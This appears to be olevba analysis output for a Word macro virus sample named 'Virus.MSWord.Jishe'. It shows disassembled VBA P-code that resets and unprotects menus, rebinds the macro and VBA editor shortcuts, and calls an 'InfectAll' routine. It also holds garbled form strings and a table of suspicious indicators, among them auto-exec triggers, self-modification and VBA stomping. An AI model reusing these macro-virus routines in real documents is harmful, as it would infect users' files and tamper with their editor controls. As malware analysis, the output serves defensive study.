' 	FuncDefn (Private Sub CommandButtonKill_Click())
' Line #48:
' 	Ld ClearVirus 
' 	IfBlock 
' Line #49:
' 	ArgsCall ResetMenu 0x0000 
' Line #50:
' 	ArgsCall InfectAll 0x0000 
' Line #51:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #52:
' 	LitStr 0x005C "°´ÕÕÄúµÄÖ¸Ê¾£¬ÎÒÒÑ¾­°Ñ¿ÉÄÜÊÇ²¡¶¾µÄ¶«¶«È«²¿ÇåÀíÍê±Ï£¬²»¹ýÒ²¿ÉÄÜºÃÐÄ°ìÁË»µÊÂ£¬ÄÇ¿É²»Òª¹ÖÎÒÓ´¡£"
' 	Ld vbOKOnly 
' 	LitStr 0x0006 "±¨¸æ£¡"
' 	ArgsCall MsgBox 0x0003 
' Line #53:
' 	ElseBlock 
' Line #54:
' 	LitStr 0x003A "²»ÖªÊ²Ã´Ô­Òò£¬Çå³ý²¡¶¾¹¤×÷²»³É¹¦£¬ÇëÄúÊÖ¹¤¼ì²é»òÓëÎÒÁªÏµ¡£"
' 	Ld vbOKOnly 
' 	LitStr 0x0010 "¼½É÷»ªÏòÄú±¨¸æ£º"
' 	ArgsCall MsgBox 0x0003 
' Line #55:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndSub 
' Line #58:
' 	QuoteRem 0x0000 0x0016 "»Ö¸´±»²¡¶¾¸ü¸ÄµÄ²Ëµ¥Ïî"
' Line #59:
' 	FuncDefn (Private Function ResetMenu(id_FFFE As Variant))
' Line #60:
' 	Dim 
' 	VarDefn mItem
' 	VarDefn cItem
' 	VarDefn myKey (As KeyBinding)
' Line #61:
' Line #62:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #63:
' 	QuoteRem 0x0004 0x0013 "Alt+F8:´ò¿ªºê¶Ô»°¿ò"
' Line #64:
' 	SetStmt 
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	Set myKey 
' Line #65:
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x000A "ToolsMacro"
' 	ParamNamed Command 
' 	Ld myKey 
' 	ArgsMemCall Rebind 0x0002 
' Line #66:
' 	QuoteRem 0x0004 0x001D "Alt+F11:´ò¿ªVisualBasic±à¼­Æ÷"
' Line #67:
' 	SetStmt 
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	Set myKey 
' Line #68:
' 	Ld wdKeyCategoryCommand 
' 	ParamNamed KeyCategory 
' 	LitStr 0x000A "ViewVBCode"
' 	ParamNamed Command 
' 	Ld myKey 
' 	ArgsMemCall Rebind 0x0002 
' Line #69:
' 	Ld wdKeyAlt 
' 	Ld wdKeyH 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #70:
' 	Ld wdKeyAlt 
' 	Ld wdKeyK 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #71:
' Line #72:
' 	QuoteRem 0x0004 0x0016 "»Ö¸´¹¤¾ß²Ëµ¥µÄÔ­Ê¼ÉèÖÃ"
' Line #73:
' 	StartForVariable 
' 	Ld mItem 
' 	EndForVariable 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #74:
' 	Ld mItem 
' 	ArgsMemCall Reset 0x0000 
' Line #75:
' 	StartForVariable 
' 	Ld mItem 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	StartForVariable 
' 	Ld cItem 
' 	EndForVariable 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #77:
' 	Ld cItem 
' 	ArgsMemCall Reset 0x0000 
' Line #78:
' 	StartForVariable 
' 	Ld cItem 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	StartForVariable 
' 	Ld cItem 
' 	EndForVariable 
' 	Ld CommandBars 
' 	ForEach 
' Line #80:
' 	Ld cItem 
' 	MemLd Visible 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #81:
' 	Ld msoBarNoProtection 
' 	Ld cItem 
' 	MemSt Protection 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	StartForVariable 
' 	Ld cItem 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' 	EndFunc 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNS
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN './Virus.MSWord.Jishe' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButtonNothing|Runs when the file is opened and ActiveX     |
|          |_Click              |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

